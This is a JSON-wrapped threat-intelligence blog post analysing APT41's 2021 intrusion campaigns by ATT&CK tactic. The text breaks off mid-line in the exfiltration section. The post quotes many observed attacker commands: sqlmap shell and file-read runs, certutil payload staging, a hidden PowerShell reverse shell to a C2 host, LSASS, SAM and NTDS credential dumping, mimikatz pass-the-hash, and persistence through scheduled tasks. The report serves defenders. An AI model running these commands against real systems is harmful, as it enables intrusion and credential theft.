{
    "id": "b03306f8-2e46-427c-a3c4-a891bb21ae28",
    "created_at": "2023-01-12T15:01:07.269242Z",
    "updated_at": "2025-03-27T02:16:58.673628Z",
    "deleted_at": null,
    "sha1_hash": "c120f3042fa67a289df74719a2a767db341fee14",
    "title": "2022-08-18 - APT41 World Tour 2021 on a tight schedule",
    "authors": "",
    "file_creation_date": "2022-09-01T10:10:53Z",
    "file_modification_date": "2022-09-01T10:10:53Z",
    "file_size": 3714105,
    "plain_text": "# APT41 World Tour 2021 on a tight schedule\n\n**blog.group-ib.com/apt41-world-tour-2021**\n\n18.08.2022\n\n4 malicious campaigns, 13 confirmed victims, and a new wave of Cobalt Strike infections\n\n\n-----\n\nNikita Rostovtsev\n\nThreat Analyst at the Advanced Persistent Threat Research Team, Group-IB\n\nIn March 2022 one of the oldest state-sponsored hacker groups, APT41, breached\ngovernment networks in six US states, including by exploiting a vulnerability in a livestock\n[management system, Mandiant investigators have reported.](https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits)\n\nThroughout 2021, we closely watched APT41’s activity using our system called Group-IB\n**Threat Intelligence, which is continuously enriched with indicators of compromise (IOCs)**\nand new rules for hunting hacker groups and threat actors. Our efforts have resulted in about\n**80 proactive notifications to private and government organizations worldwide regarding**\nAPT41 attacks (both in progress and completed) against their infrastructures so that the\n\n\n-----\n\norganizations could take the necessary steps to protect themselves or search for traces of\ncompromise in their networks. The data about the tactics, techniques and procedures (TTPs)\nused by the attackers that we collected helped us attribute the group’s other attacks. Using\nthis data, we identified the threat actors’ “work” schedule, which makes it possible to\ndescribe their origin in more detail. In this blog post, we share our findings and describe the\nmain methods, tactics and tools used by one of the most dangerous threat groups out there,\nAPT41, in 2021.\n\nThis blog post, which was written to bring together existing knowledge according to the\nMITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) framework, details\nhow the hackers conducted reconnaissance, gained initial access, ensured persistence and\nmoved across the network, as well as what they were looking for on the compromised\ndevices. In addition, we share interesting findings such as the “work” schedule and working\ndays of the attackers, together with artifacts they left behind.\n\nThe first thing we want to mention is that APT41 used an unusual method of creating\npayloads on target servers, which involves writing an encoded payload in the form of a\nCobalt Strike Beacon to a file in multiple stages. To search for and exploit vulnerabilities, the\ngroup uses popular tools such as Acunetix, Nmap, JexBoss, sqlmap, and fofa.su (a Chinese\nequivalent of Shodan).\n\nInterestingly, according to sqlmap logs, the threat actors breached only half of the websites\nthey were interested in. This suggests that even hackers like APT41 do not always go out of\ntheir way to ensure that a breach is successful.\n\nThis blog post also uncovers subnets from which the threat actors connected to their C&C\nservers, which is further evidence confirming the threat’s country of origin.\n\nFor the first time, we were able to identify the group’s working hours in 2021, which are\nsimilar to regular office business hours.\n\nIT directors, heads of cybersecurity teams, SOC analysts and incident response specialists\nare likely to find this material useful. Our goal is to reduce financial losses and infrastructure\ndowntime as well as to help take preventive measures to fend off APT41 attacks.\n\nIn the conclusion section, we give advice on how to identify the group’s infrastructure and\nprotect yours. Let us hunt together for the threats, and contribute to the fight against\ncybercrime — a mission worthy of a superhero.\n**Who are APT41?**\n\nA state-sponsored group whose goals include cyber espionage and financial gain\nActive since at least 2007\nAlso known as BARIUM, Winnti, LEAD, WICKED SPIDER, WICKED PANDA, Blackfly,\nSuckfly, Winnti Umbrella, Double Dragon\n\n\n-----\n\nSome of the group s members were indicted by the US Department of Justice in 2020;\n[charges against them include unauthorized access to protected computers, aggravated](https://www.fbi.gov/wanted/cyber/apt-41-group)\nidentity theft, money laundering, and wire fraud\n\n**Key findings**\n\n**We estimate that in 2021 APT41 compromised and gained various levels of access to**\n**at least 13 organizations worldwide.**\n\n**The group’s targets include government and private organizations based in the US,**\n**Taiwan, India, Thailand, China, Hong Kong, Mongolia, Indonesia, Vietnam,**\n**Bangladesh, Ireland, Brunei, and the UK.**\n\n**In the campaigns that we analyzed, APT41 targeted the following industries: the**\n**government sector, manufacturing, healthcare, logistics, hospitality, finance,**\n**education, telecommunications, consulting, sports, media, and travel. The targets also**\n**included a political group, military organizations, and airlines.**\n\n**To conduct reconnaissance, the threat actors use tools such as Acunetix, Nmap,**\n**Sqlmap, OneForAll, subdomain3, subDomainsBrute, and Sublist3r.**\n\n**As an initial vector, the group uses web applications vulnerable to SQL injection**\n**attacks.**\n\n**By performing SQL injections, APT41 gains access to the command shell of a targeted**\n**server and becomes able to execute commands.**\n\n**We estimate that in 2021 APT41 detected and exploited SQL injection opportunities in**\n**43 out of 86 web applications that they probed.**\n\n**The main tool used in their campaigns is a custom Cobalt Strike Beacon.**\n\n**APT41’s “working” days are Monday to Friday. They usually start at 10 AM and finish**\n**around 7 PM (UTC+8).**\n\n**Attack geography and target industries**\n\nFirst, we will list all the countries and industries that came to our attention in 2021. Over this\nperiod, APT41 conducted at least four malicious campaigns, which we named based on the\n[domain names used in the attacks: ColunmTK, DelayLinkTK, Mute-Pond, and Gentle-Voice.](https://blog.group-ib.com/colunmtk_apt41)\n\n\n-----\n\nThe targets in these campaigns were organizations in the US, Taiwan, India, China,\nThailand, Hong Kong, Mongolia, Indonesia, Vietnam, Bangladesh, Ireland, Brunei, and the\nUK:\n\nNews agencies, government organizations, a major electronics manufacturer, and a\n\nlogistics company in Taiwan\nA software developer and several companies that own a chain of hotels in the US\nA financial organization and an educational entity in Vietnam\nA news agency and a software developer in China\nAn Indian airline\n\n\n-----\n\n**TTPs**\n\n\n-----\n\nThis section describes APT41 s tactics, techniques and procedures that came to the\nattention of Group-IB’s Threat Intelligence team in 2021.\n\nReconnaissance\n\nThe first stage of any attack is reconnaissance, as part of which threat actors use a wide\nrange of techniques to collect data about the target organization. They can be divided into\ntwo categories: active and passive scanning. Below is a list of tools used by APT41 from\nboth categories:\n\n**Active scanning. T.1595:**\n\nAcunetix vulnerability scanner\nNmap network scanner\nUtilities for brute-forcing directories on web servers: OneForAll, subdomain3,\nsubDomainsBrute, Sublist3r\nJexBoss, a tool for searching for and exploiting vulnerabilities in Jbos and other Java\napplications\n\n**Passive scanning. Search Open Technical Databases: Scan Databases T1596.005:**\n\nfofa.su (a Chinese equivalent of shodan.io) scans the Internet and collects information\nabout open ports and services running on them, which enables attackers to determine\ntheir targets and conduct attacks more effectively.\n\nInitial Access\n\n**Exploit public-facing application - T1190**\n\nA major question for an investigator is how the attackers penetrated the target system. At the\npenetration stage, APT41 threat actors used various techniques, including spear-phishing\nemails, exploiting a range of vulnerabilities (including Proxylogon), and watering hole and\nsupply chain attacks. In the campaigns we analyzed, in some cases the threat actors\npenetrated target systems using SQL injections. Below we describe the commands used by\nAPT41 in detail. Such attacks were carried out with the publicly available tool SQLmap,\nwhich the attackers used for multiple purposes.\n\nIn some organizations APT41 members gained access to the command shell of a target\nserver and were able to execute certain commands. The group also used this tool to upload\nfiles to the target server. At this stage, the files were either Cobalt Strike Beacons or custom\nweb shells.\n\nIn other cases, the threat actors gained access to databases with information about existing\naccounts, lists of employees, and plaintext and hashed passwords.\n\nNevertheless, the main tool that the attackers used in their campaigns was Cobalt Strike\nBeacon.\n\n\n-----\n\nSQLmap launched in various attacks:\n```\npython sqlmap.py -r [Company1_domain].txt --tamper=space2comment --random-agent -p\nctl00%24ContentPlaceHolder1%24txtUserName,ctl00%24ContentPlaceHolder1%24txtPassword -os-shell\n\npython sqlmap.py -r [Company2_domain].txt -p\n\"ctl00%24MainContent%24txtUserName,ctl00%24MainContent%24txtPassword\" --is-dba --hex\n\nsqlmap.py -u [Company3_domain]/content.php?id=2141&sub=153 --random-agent -tamper=space2comment --time-sec=10 --current-user\n\npython sqlmap.py -r [Company4_domain] -p\n\"ctl00%24ContentPlaceHolder1%24txtUserName,ctl00%24ContentPlaceHolder1%24txtPassword\"\n--file-write=\"/root/sqlmap/{Redacted_filename}.aspx\" --file-dest=\"\n{Redacted_filepath}\\\\login1.aspx\"\n\npython sqlmap.py -u \"http://[Company5_domain]/[redacted]/[redacted]/[redacted].php/?\npage1=DM&page2=TOTAL_DATA_DOWNLOAD&page3=TOTAL_DATA_DOWNLOAD\" -p \"page1\" --file-read\n\"/etc/passwd\"\n\n```\nThe SQL injections enabled the threat actors to gain various levels of access to 43 out 86\nwebsites they probed. The following diagrams were built based on sqlmap logs. According to\nthis data, MySQL was installed on most of the compromised websites.\n\nExecution\n\nWindows Command Shell - T1059.003 Command and Scripting Interpreter\n\nAt this stage of attack, in order to upload malicious code to target devices and execute it, the\nthreat actors chose the following unique method:\n\n1\n\nOnce the payload is compiled, it is encoded in Base64.\n\n2\n\nThe encoded payload is divided into chunks of 775 characters and added to a text file using\nthe following command: Echo [Base64]{775} >> C:\\dns.txt\n\n3\n\n\n-----\n\nOnce the encoded payload has been written to a file, the utility called certutil with the\nparameter —decode is launched. The utility converts the Base64-encoded payload into an\n.exe file. Certutil is a built-in tool in Windows systems.\n\n4\n\nAfter the file is decoded, the attackers launch certutil again, with the parameter —hashfile.\nThis parameter is necessary to obtain the hash of the resulting file. This action has to do with\nthe fact that the attackers conduct each iteration manually and could make a mistake at a\ncertain point. Checking the file hash helps ensure that the data has been written correctly\nand that the payload has been decoded without any errors.\n\n5\n\nThe file is then renamed and sent to other directories to cover any tracks, after which the\nattackers launch it.\n\nThey used Cobalt Strike Beacon as a payload. In one of the observed cases, in order to write\nthe entire payload to a file, the threat actors needed to repeat this action 154 times.\n```\necho\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAA\n >> C:\\dns.txt\n\n---\necho\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n C:\\dns.txt\n\necho\n5kgXfx+Ig8S1vr8p7ifpkRNTIwypOpYrBDdptgjbLcJBcAUqEK/+D85bYT9RGiYYZ9UR4ejo6ca0B/iWEW8b+R\n C:\\dns.txt\ncertutil -decode C:\\dns.txt C:\\dns.exe\n\ncertutil -hashfile C:\\dns.exe\n\ncopy C:\\dns.exe C:\\WINDOWS\\dns.exe\n\nmove C:\\dns.exe C:\\windows\\mciwave.exe\n\n```\nThe same method of dividing the payload was observed in the network belonging to another\norganization, where the threat actors divided the code into chunks of 1,024 characters. To\nwrite the payload fully, in this case they needed 128 iterations.\n\n\n-----\n\n```\necho\no3wiZy3M7pERynevamNQTtL5VZf3C+vS22sRbsUgj8Lw005hIB1mVlNyvdw5GWrKgdMrpkJ2mYamD3sHBuU6yK\n >> C:\\temp\\bug.txt\n\necho\nWv39JqjpZEGW7rjPYW5t09Ck9AQTc94kJ5nfTPEh6KVvRAeuMw23lQdZy/ZquMQOcy9ozRl7OyrQPtKwHYC0+p\n >> C:\\temp\\bug.txt\n\n```\nBelow are other identified methods of uploading and executing malicious files. These are not\nunique:\n\nCommand and Scripting Interpreter: PowerShell - T1059.001\n\nAPT41 used PowerShell to obtain a reverse shell. The PowerShell code that the group used\nwas executed in stealth mode and meant that the device it was executed on could\ncommunicate with the C&C server, which in turn allowed the threat actors to execute remote\ncommands.\n```\npowershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object\nNet.Sockets.TCPClient('{redacted}', 80);$NetworkStream =\n$TCPClient.GetStream();$StreamWriter = New-Object\nIO.StreamWriter($NetworkStream);function WriteToStream ($String)\n{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | %\n{0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream\n'';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)\n{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output =\ntry {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | OutString}WriteToStream ($Output)}$StreamWriter.Close()\"\n\n```\nScheduled Task/Job: Scheduled Task - T1053.005\n\nTask Scheduler was used to launch malicious files on computers where the threat actors\nalready had sessions as well as on computers that the group discovered during\nreconnaissance.\n```\nSCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /RU\nSYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\"\nSCHTASKS /run /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /TN\nExec2022\n\n```\nSystem Services: Service Execution - T1569.002\n\nWindows services were created and launched with the aim of running either an executable or\n[a script file called install.bat. We described it in our blog post about the ColunmTK campaign.](https://blog.group-ib.com/colunmtk_apt41)\nThis file has been mentioned several times by other vendors (e.g., Mandiant), which is why\nwe are not describing it in detail here,\n\n\n-----\n\n```\nsc \\\\172.16.2.146 Create SuperIe binPath cmd.exe /k c:\\users\\public\\install.bat ;\n\nsc \\\\192.168.111.112 create res binpath=\"C:\\PerfLogs\\vmserver.exe\";\n\nsc \\\\192.168.111.112 start res;\n\nsc query LxpSrvc;\n\nsc delete LxpSrvc;\n\n```\nWindows Management Instrumentation - T1047\n\nThe hackers did not overlook Windows Management Instrumentation and used the technique\nin several malicious campaigns.\n```\nwmic /node:172.19.97.102 /user:{redacted}\\{redacted} /password:P$ssw0rd0006 process\ncall create \"C:\\users\\Public\\COMSysUpdate.exe\"\n\nwmic /node:172.21.2.177 /user:{redacted}\\{redacted} /password:Passw0rd@123 process\ncall create \"c:\\users\\Public\\install.bat\"\n\n```\nPersistence\n\nTo ensure persistence in target systems, the attackers used Task Scheduler and created\nWindows services.\n\nScheduled Task/Job: At (Windows) - T1053.002\n```\nschtasks /create /s 192.168.111.3 /u {redacted} /p {redacted} /tn dda /sc onstart /tr\nC:\\PerfLogs\\vmserver64.exe /ru system /f\nSCHTASKS /Create /S 10.200.244.222 /U test\\administrator /P {redacted} /RU \"system\"\n/tn rlsv /sc DAILY /tr c:\\2012.bat /F\nSCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P {redacted} /RU\nSYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\"\nschtasks /create /tn rlsv1 /U test\\Administrator /P {redacted} /tr C:\\2012.bat /sc\nDAILY /s 10.200.244.222 /RU system\nSCHTASKS /Create /RU SYSTEM /SC ONSTART /TN Update /TR \"C:\\windows\\system32\\calc.exe\"\n\nSCHTASKS /Create /RU SYSTEM /SC ONSTART /TN dllhosts /TR \"dllhosts.exe\"\n\nschtasks.exe /s 192.168.0.28 /u \"administrator\" /p {redacted} /Create /tn VMUSS /tr\n\"c:\\users\\public\\install.bat\" /st 15:58 /sc once /ru system\n\n```\nSystem Services: Service Execution - T1543.003\n```\nsc \\\\172.26.16.81 Create SuperIe binPath= \"cmd.exe /k\nc:\\users\\public\\SecurityHealthSystray.exe\"\n\nsc Create syscmd binpath=\"cmd/k start\"type= own type= interact\n\nsc \\\\192.168.111.112 create res binpath=\"C:\\PerfLogs\\vmserver.exe\"\n\nsc start LxpSrvc\n\n```\nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder - T1547.001\n\nIn some cases the threat actors placed their malicious files in the startup folder on remote\ncomputers, which made the files execute every time the victim's operating system was\nlaunched.\n\n\n-----\n\n```\ncopy C:\\temp\\LxpSvc.exe \\\\192.168.100.4\\c$\\Users\\administrator.\n{redacted}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LxpSvc.exe\"\n\n```\nPrivilege Escalation\n\nOur analysis did not reveal any instances of APT41 using unique ways of escalating\nprivileges in the network. In addition to the standard capabilities of Cobalt Strike, for such\npurposes APT41 mainly used additional modules and cna. Publicly available tools for local\nprivilege escalation (such as BadPotato) were also used to establish persistence. Moreover,\nthe attackers used password hashes or accounts obtained at the reconnaissance stage.\n```\ncmd.exe /c c:\\windows\\Temp\\BadPotatoNet4.exe c:\\windows\\Temp\\COMSysCon.exe;\n\nexecute-assembly C:\\Users\\Administrator\\Desktop\\SweetPotato.exe\nE:\\Projects\\Operations\\uploads\\documents\\docs\\AxInstSV.exe.\n\n```\nDefense Evasion\n\nObfuscated Files or Information: Software Packing - T1027.002\n\nBeing discreet and staying in the victim's network unnoticed for as long as possible is the\ngoal of any APT. How did APT41 members try to avoid being noticed and cover their tracks?\nThe threat actors used the well-known protection tool Themida to obfuscate their malicious\nfiles.\n\nIndicator Removal on Host: File Deletion - T1070.004\n\nWhen certain files were no longer needed, the attackers deleted them.\n```\ndel C:\\temp\\LxpSvc.exe\n\ndel c:\\users\\public\\BadPotatoNet4.exe\n\ndel \\\\172.16.2.21\\c$\\users\\Public\\SecurityHealthSystray.dll\n\ndel \\\\172.16.2.21\\c$\\users\\Public\\SecurityHealthSystra.ocx\n\ncopy \"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServicesRemoteConnectionManager%4Operational.evtx\" \"C:\\PerfLogs\\mwt.evtx\"\n\nC:\\PerfLogs\\mwt.evtx\n\nrm C:\\PerfLogs\\mwt.evtx\n\n```\nFile and Directory Permissions Modification: Windows File and Directory Permissions\nModification - T1222\n```\nicacls \\\\192.168.0.243\\c$\\www\\{redacted}\\test2.asp /grant IIS_IUSRS:F\n\n```\nImpair Defenses: Indicator Blocking - T1562.006\n\nAs mentioned earlier, Cobalt Strike was the main tool used in all the campaigns.\n\n\n-----\n\nThe threat actors developed a custom injector that makes it possible to bypass Event\nTracing for Windows (ETW), thereby making the process invisible to the logging system\nin Windows.\nThe second noteworthy feature of this injector is a method taken from an open GitHub\nrepository. The idea is to be able to launch a new process in a way as to ensure that\nneither Windows nor antivirus software can inject their binaries into this process, which\nenables the threat actors to bypass built-in antivirus tools.\n\n[The tool is called StealthMutant and it has been described in detail by researchers at Trend](https://documents.trendmicro.com/assets/white_papers/wp-earth-baku-an-apt-group-targeting-indo-pacific-countries.pdf)\nMicro.\n\nCredential Access\n\nThis section outlines how the threat actors obtained credentials. To do so, APT41 uses\nseveral different, fairly popular techniques.\n\nOS Credential Dumping: NTDS - T1003.003\n\nThe Group-IB Threat Intelligence team discovered that 2021 APT41 campaigns most often\ninvolved a Windows utility called Ntdsutil. The attackers used the tool to obtain a copy of the\nntds.dit file, which is a database that stores Active Directory data, including information about\nuser objects, groups, and group membership. The database also includes the password\nhashes for all the users of the domain.\n```\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\perflogs\\temp\" q q\n\nntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\PerfLogs\\temp\" quit quit\n\n```\nOS Credential Dumping: Security Account Manager - T1003.002\n\nThe threat actors also extracted account data from the Security Account Manager (SAM).\nSAM manages the Windows account database, which includes storing passwords and\nprivate user data, grouping the logical structure of accounts, setting security policies,\ncollecting statistics, and controlling access to the database. This data is available either in\nthe registry key HKEY_LOCAL_MACHINE\\SAM\\SAM or in a binary file at\n%WINDIR%\\System32\\Config\\SAM. The attackers tried to make a copy of this database\nfrom the registry using the “reg save” command or by exploiting volume shadow copies.\n```\nreg save HKLM\\SAM C:\\perflogs \\sam.save\n\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy11\\Windows\\System32\\config\\SAM\nc:\\users\\public\\SAM\n\n```\nOS Credential Dumping: LSASS Memory -T1003.001\n\n\n-----\n\nAnother source of account credentials is the Local Security Authority Subsystem Service\n(LSASS) memory. It is a process in Microsoft Windows operating systems that enforces the\nsecurity policy on the system. It verifies users logging on to a Windows computer or server,\nhandles password changes, and creates access tokens. To dump the LSASS process, the\nthreat actors used the utilities Procdump and Mimikatz.\n```\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n\nC:\\mi.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords full\"\" exit >> C:\\log.tx\n\nmimikatz's sekurlsa::logonpasswords\n\n```\nCredentials from Password Stores: Credentials from Web Browsers - T1555.003\n\nThe threat actors used BrowserGhost, which is a tool designed to obtain credentials from\nbrowsers.\n```\nBrowserGhost.exe >> iis.txt\n\n```\nUnsecured Credentials: Credentials In Files - T1552.001\n\nThe attackers also searched for strings that contain keywords like \"user\" or \"password\" in\nspecific files or entire directories.\n```\nfindstr /c:\"User\" /c:\"Password\" /si web.config\n\nfindstr /c:\"User ID=\" /c:\"Password=\"\n\n```\nDiscovery\n\nThreat actors usually use this stage to obtain more information about the infected computer\nand its local network. At this point, cybercriminals most often leverage the tools built into the\noperating system.\n\nAccount Discovery - T1087\n\nThe Net utility is used to display information about the computer's network configuration. The\nutility helped the adversaries gather information about domain group membership and collect\nlists of administrators.\n```\nnet user /domain > 1.txt\n\nnet user\n\nnet localgroup administrators\nnet accounts /domain\n\nnet group \"Domain Admins\"\n\n```\nSystem Information Discovery - T1082\n\nAt this stage, the attackers gathered information about the system basic configuration (e.g.,\nthe Windows version or system architecture).\n\n\n-----\n\n```\necho %PROCESSOR_ARCHITECTURE%\n\nsysteminfo\n\nwhoami\n\nnet config Workstation\n\n```\nPermission Groups Discovery - T1069\n\nThe adversary obtained a list of objects from Windows groups as follows:\n```\nnet group \"Domain Admins\" /domain\n\nnet group \"domain Controllers\"\n\nnet group \"Exchange Servers\"\n\nnet group \"Schema Admins\"\n\nnet group \"Protected Users\"\n\nnet group \"Enterprise Admins\"\n\nnet group \"Enterprise Read-only Domain Controllers\"\n\nnet group \"Exchange Domain Servers\"\n\n```\nQuery Registry - T1012\n\nThe hackers made queries to the registry to obtain information about the currently used RDP\nports or network configurations.\n```\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDPTcp /v PortNumber\"\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\"\n\nreg query \"HKEY_LOCAL_MACHINE\n\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\{1f777394-0b42-11e380ad-806e6f6e6963}\"\n\n```\nDomain Trust Discovery - T1482\n```\ndsquery site\n\n```\nSystem Time Discovery - T1124\n```\nnet time /domain\n\n```\nProcess Discovery - T1057\n\nIn some cases, the threat actors conducted reconnaissance on remote devices to establish\nwhether files with certain names were running on them. The attackers had downloaded these\nfiles to remote devices earlier.\n```\ntasklist /pid 1428 /f\n\ntasklist /s 172.16.2.132 /u test\\administrator /p {redacted}\n\ntasklist | findstr update_x64.exe\n\n```\nNetwork Service Scanning - T1046\n\n\n-----\n\nAt this stage, the threat actors also used a publicly available tool called cping to identify local\ncomputers vulnerable to SMB attacks.\n```\nC:\\PerfLogs\\cping40.exe scan smbvul 10.0.0.1 10.0.10.1 > 10.txt\n\ncping40.exe scan smbvul 192.168.20.1 192.168.29.1 > 30.txt\n\n```\nNetwork Share Discovery - T1135\n\nThe threat actors attempted to detect available network drives:\n```\nnet share\n\nnet view /DOMAIN\n\n```\nSystem Network Configuration Discovery - T1016\n\nOne of the ways in which the threat actor obtained information about the available network\nconfiguration was to access the registry key directly:\n```\nreg query \"HKEY_LOCAL_MACHINE\n\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\{1f777394-0b42-11e380ad-806e6f6e6963}\"\n\n\n```\nSystem Network Connections Discovery - T1049\n\nTo identify network connections, the hackers used a built-in utility called netstat:\n```\nnetstat -ano\n\nnetstat -r\n\nnetstat -an\n\nnetstat -aon|findstr \"8080\"\n\nnetstat -ano | findstr dns.exe\n\n```\nRemote System Discovery - T1018\n\nThe hackers used the Ping command with a single echo request to identify other devices on\nthe local network. In order to simplify their tasks, they used a FOR loop. They also used the\nSETSPN utility to identify on which devices in the domain a particular service was running.\nThis helped the attackers identify which devices were running the following services: IIS,\nSQL and MSSQL.\n\nIt is important to note that in one of the cases we analyzed, the threat actors used the\n“payload” string instead of the necessary one, which indicates that the command was copied\nfrom another source.\n\n\n-----\n\n```\nping n 1 PIST FILE SRV\n\nfor /l %i in (1,1,255) do @ping 172.67.204.%i -w 1 -n 1|find /i \"ttl=\"\n\nsetspn -T [target_company_name4] -Q */* | payload\n\nsetspn -T [target_company_name6] -Q */* | findstr IIS\n\nsetspn -T [target_company_name5] -Q */* | findstr SQL\n\nsetspn -T [target_company_name6] -Q */* | findstr MSSQL\n\n```\nLateral Movement\n\nTo move laterally, the threat actors used credentials gathered at the previous stage. If they\nonly had password hashes, they carried out Pass-The-Hash attacks using Mimikatz.\n\nUse Alternate Authentication Material: Pass the Hash - T1550.002\n```\nmimikatz's sekurlsa::pth /user:Administrator /domain:{redacted} /ntlm:{redacted}\n/run:\"%COMSPEC% /c echo 70c64df2976 > \\\\.\\pipe\\277bf3\"\n\nmimikatz's sekurlsa::pth /user:{redacted} /domain:{redacted} /ntlm:{redacted}\n/run:\"%COMSPEC% /c echo 22074328564 > \\\\.\\pipe\\bce0a1\"\n\n\n```\nLateral Tool Transfer - T1570\n```\njump psexec64 {redacted} dns\nwindows/beacon_dns/reverse_dns_txt (ns1.colunm.tk:53) on {redacted} via Service\nControl Manager (\\\\[redacted]\\ADMIN$\\c3632b3.exe)\n\ncopy c:\\users\\public\\COMSysUpdate.exe\n\\\\172.19.97.101\\c$\\users\\public\\COMSysUpdate.exe\n\n```\nCollection\n\nArchive Collected Data: Archive via Utility - T1560.001\n\nTo collect data, APT41 downloaded a portable archiver file to compromised devices. The\ngroup archived the necessary files and exfiltrated them to their intermediate server.\n```\n7z.exe a syslog.7z Intl\n\n7z.exe a iislog.7z Intl\n\n7z.exe a Ops.7z C:\\PerfLogs\\Ops\\\n\nC:\\perflogs\\7z.exe a -tzip C:\\perflogs\\nt.zip C:\\perflogs\\temp\\\n\n```\nData from Configuration Repository - T1602\n\nOn the network belonging to a software developer, the hackers gained access to the\ndeveloper’s private GitHub repository. The repository was used to store various sensitive\ndata such as credentials for remote servers, private certificates, and a list of servers.\n\n\n-----\n\n```\nshell git clone ssh://jenkins@{redacted}:29418/DevOps/Playbook2\n\nshell git clone \"ssh://jenkins@{redacted}:29418/DevOps/Inventory/Cloud/Intl\"\n\nshell git clone \"ssh://jenkins@192.168.0.251:29418/DevOps/Inventory\"\n\n```\nData from Local System - T1005\n\nThe group obtained files from shadow copies and the Windows logging system.\n```\nvssadmin list shadows\n\nvssadmin create shadow /for=c:\n\nvssadmin delete shadows /for=c: /quiet\n\nesentutl /p /o ntds.dit\n\ncopy \"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServicesRemoteConnectionManager%4Operational.evtx\" \"C:\\PerfLogs\\mwt.evtx\"\n\ncopy \"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServicesRemoteConnectionManager%4Operational.evtx\" \"C:\\PerfLogs\\mwt.evtx\"\n\nrd:true /q:\"*[System[(EventID=4624 or EventID=4648 or EventID=4672)] and\nEventData[(Data[@Name='LogonType']='2' or Data[@Name='LogonType']='10')]]\"| findstr\n/i /c:\"Date\" /c:\"Logon Type:\" / c:\"Account Name\" /c:\"Workstation Name:\" / c:\"Source\nNetwork Address\"\n\n```\nCommand and Control\n\nAs mentioned above, most APT41 attacks were conducted using Cobalt Strike.\n\nApplication Layer Protocol: Web Protocols - T1071.001\n\nThe group used HTTP and HTTPS listeners to communicate with C&C servers.\n\n\n-----\n\nApplication Layer Protocol: DNS - T1071.004\n\nTo hide all communication with C&C servers, the threat actors also used DNS tunnels.\n\nIngress Tool Transfer - T1105\n\nThe threat actors used Cobalt Strike to upload their files to compromised devices. For certain\ntargeted organizations, the group uploaded files from special directories named after the\ncompromised organization.\n```\nupload C:\\Users\\Administrator\\Desktop\\cs\\dns\\COMSysUpdate.ocx\n\nupload C:\\Users\\Administrator\\Desktop\\webshell\\uploada4.aspx\n\nupload c:\\users\\alex\\desktop\\smb.exe\n\nupload C:\\Users\\Administrator\\Desktop\\cs\\SecurityHealthSystray.dll\n\nupload C:\\Users\\Administrator\\Desktop\\cs\\install.bat\n\nupload C:\\Users\\jack\\Desktop\\tmp\\cs_shell\\server\\install.bat\n\nupload C:\\Users\\jack\\Desktop\\tmp\\cs_shell\\server\\bthsvc64.dll\n\nupload C:\\Users\\jack\\Desktop\\tmp\\procdump64.exe\n\nupload C:\\Users\\jack\\Desktop\\{redacted}\\244\\mciwave32.dll\n\nupload C:\\Users\\Admin\\Desktop\\{redacted}\\HTTPS\\LxpSvc.exe\n\nupload C:\\Users\\Admin\\Desktop\\Webshell\n\nupload C:\\Users\\Admin\\Desktop\\{redacted}\\webshell\\test4.aspx\n\nupload C:\\Users\\Admin\\Desktop\\{redacted}\\远控\\service\\install.bat\n\nupload C:\\Users\\Admin\\Desktop\\{redacted}\\LxpSrvc.dll\n\nupload C:\\Users\\Admin\\Desktop\\{redacted}\\远控\\exe\\dfss.dll\n\nupload C:\\Users\\Administrator\\Desktop\\BadPotatoNet4.exe\n\n```\nProxy : Internal Proxy - T1090.001\n\nIn the attacks we analyzed, APT41 often used a tool for proxying traffic called FRPC.\n```\nfrcp.exe -c frcp.ini\n\n```\nExfiltration\n\nExfiltration Over C2 Channel - T1041\n\nAt the exfiltration stage, APT41 gained access to various server configurations, backup data,\nand user data. The group most likely did not exfiltrate a large amount of confidential\ndocuments.\n\n\n-----\n\n```\ndownload D:\\projects\\{redacted}\\web.config;\n\ndownload D:\\projects\\{redacted}\\css\\help.txt;\n\ndownload D:\\System Volume Information\\002.dat;\n\ndownload D:\\projects\\{redacted}\\Web.config;\n\ndownload D:\\{redacted}\\{redacted}20210301120008.txt;\n\ndownload c:\\ftpcmd.dat;\n\ndownload c:\\AppTextFile.txt;\n\ndownload c:\\Users\\Administrator\\Desktop\\OfcNTCer.dat;\n\ndownload c:\\Users\\{redacted}\\Desktop\\172.16.11.103.png;\n\ndownload c:\\Users\\{redacted}\\Desktop\\FTP batch\\ftp_servername.bat;\n\ndownload c:\\Users\\{redacted}\\Desktop\\FTP 